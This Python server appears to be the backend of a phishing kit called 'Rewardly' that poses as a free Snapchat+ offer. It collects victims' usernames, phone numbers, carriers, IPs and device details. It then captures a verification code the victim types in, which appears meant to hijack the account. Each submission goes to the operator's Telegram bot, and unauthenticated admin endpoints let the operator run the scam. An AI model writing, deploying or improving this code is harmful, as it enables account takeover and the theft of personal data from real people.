import json, os, time, threading, urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime, timezone

PORT = int(os.environ.get("PORT", 3000))
SITE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")

SERVICES = {"snap": "Snapchat+"}

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

requests_db = {}
history_log = []
blocked_phones = set()
blocked_users = set()


def norm_phone(p):
    return "".join(ch for ch in str(p or "") if ch.isdigit())


def load_data():
    global requests_db, history_log, blocked_phones, blocked_users
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        requests_db = {k: v for k, v in d.get("requests", {}).items()}
        history_log = list(d.get("history", []))
        blocked_phones = set(d.get("blocked_phones", []))
        blocked_users = set(d.get("blocked_users", []))
        print("[server] donnees chargees (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
    except Exception:
        pass


def persist():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "requests": requests_db,
                "history": history_log[-200:],
                "blocked_phones": sorted(blocked_phones),
                "blocked_users": sorted(blocked_users),
            }, f, ensure_ascii=False)
    except Exception as e:
        print("[server] echec sauvegarde: %s" % e)


def format_phone(n):
    s = str(n or "").strip()
    if not s:
        return ""
    out = ""
    count = 0
    for ch in s:
        if ch.isdigit():
            if count and count % 2 == 0:
                out += " "
            count += 1
        out += ch
    return out


def tg_send(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = "https://api.telegram.org/bot%s/sendMessage" % TELEGRAM_BOT_TOKEN
        body = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }).encode("utf-8")
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            resp.read()
    except Exception as e:
        print("[telegram] echec:", e)


def tg_notify_request(data, rid):
    if not TELEGRAM_BOT_TOKEN:
        return
    text = (
        "📲 <b>Nouvelle demande Snap+</b>\n"
        "─────────────\n"
        "Service : <b>Snapchat+</b>\n"
        "Pseudo : %s\n"
        "Compte : %s\n"
        "Numero : <code>%s</code>\n"
        "Operateur : %s\n"
        "ID : <code>%s</code>"
    ) % (
        str(data.get("pseudo") or "-"),
        str(data.get("handle") or "-"),
        format_phone(data.get("phone")) or "-",
        str(data.get("operator") or "-"),
        rid[:8].upper(),
    )
    tg_send(text)


class Server(SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=SITE_DIR, **kw)

    def log_message(self, fmt, *args):
        if "304" not in str(args):
            super().log_message(fmt, *args)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        p = urlparse(self.path).path

        if p == "/":
            self.path = "/choose.html"
            return super().do_GET()

        if p.startswith("/api/status/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "status": "expired"})
            if r["state"] == "done":
                return self._json({"ok": True, "status": "resolved"})
            if r.get("code_sent"):
                return self._json({"ok": True, "status": "code_sent", "at": r["code_sent_at"]})
            return self._json({"ok": True, "status": "pending"})

        if p == "/api/admin/list":
            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at"), "user_code": r.get("user_code"), "user_code_submitted": bool(r.get("user_code"))} for rid, r in requests_db.items() if r["state"] == "pending"]
            return self._json({"ok": True, "items": items})

        if p == "/api/admin/history":
            return self._json({"ok": True, "items": history_log[-50:][::-1]})

        if p == "/api/admin/blocked":
            return self._json({"ok": True, "items": sorted(blocked_phones)})

        super().do_GET()

    def do_POST(self):
        p = urlparse(self.path).path
        n = int(self.headers.get("Content-Length", 0))
        try:
            d = json.loads(self.rfile.read(n)) if n else {}
        except Exception:
            d = {}

        if p == "/api/request":
            rid = d.get("rid", "")
            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator", "opType", "ip", "device", "browser", "os"]}
            phone = norm_phone(data.get("phone"))
            if phone and phone in blocked_phones:
                requests_db[rid] = {
                    "data": data, "state": "done", "by": "block",
                    "code_sent": False, "code_sent_at": None,
                    "ts": d.get("ts", int(time.time() * 1000)),
                }
                history_log.append({"action": "block", "data": d, "ts": int(time.time() * 1000)})
                persist()
                tg_notify_request(data, rid)
                return self._json({"ok": True})

            requests_db[rid] = {
                "data": data, "state": "pending",
                "code_sent": False, "code_sent_at": None,
                "ts": d.get("ts", int(time.time() * 1000)),
            }
            print("[server] Nouvelle demande: %s (%s)" % (data.get("pseudo"), phone))
            persist()
            tg_notify_request(data, rid)
            return self._json({"ok": True})

        if p == "/api/code":
            rid = d.get("rid", "")
            code = d.get("code", "")
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False}, 404)
            r["user_code"] = code
            r["code_submitted_at"] = int(time.time() * 1000)
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/accept/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            r["state"] = "pending"
            history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/refuse/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "refuse"
            history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/code/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True})

        if p == "/api/admin/block":
            phone = norm_phone(d.get("phone", ""))
            if not phone:
                return self._json({"ok": False, "error": "missing_phone"})
            blocked_phones.add(phone)
            history_log.append({"action": "block", "data": {"phone": phone}, "ts": int(time.time() * 1000)})
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p == "/api/admin/unblock":
            phone = norm_phone(d.get("phone", ""))
            blocked_phones.discard(phone)
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p in ("/api/visit", "/api/log"):
            return self._json({"ok": True})

        self.send_error(404)


if __name__ == "__main__":
    print("\n  Rewardly - http://0.0.0.0:%d\n" % PORT)
    load_data()
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        print("[telegram] active")
    else:
        print("[telegram] desactive")
    HTTPServer(("0.0.0.0", PORT), Server).serve_forever()